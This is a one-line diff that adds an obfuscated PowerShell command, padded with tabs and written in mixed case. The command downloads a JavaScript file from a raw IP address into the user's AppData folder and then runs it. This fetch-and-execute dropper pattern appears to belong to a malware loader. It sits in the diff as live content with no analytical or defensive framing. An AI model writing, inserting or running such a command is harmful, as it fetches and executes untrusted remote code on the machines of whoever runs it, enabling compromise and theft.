@@ -1,0 +1,1 @@
+    wGET 							”http://38.247.161.228/18/wethinkingsureforme.js” 							-OutfilE 																	”$ENV:ApPDAta\wethinkingsureforme.js” 																										;    		  		 		 & 		”$EnV:APPDATa\wethinkingsureforme.js”
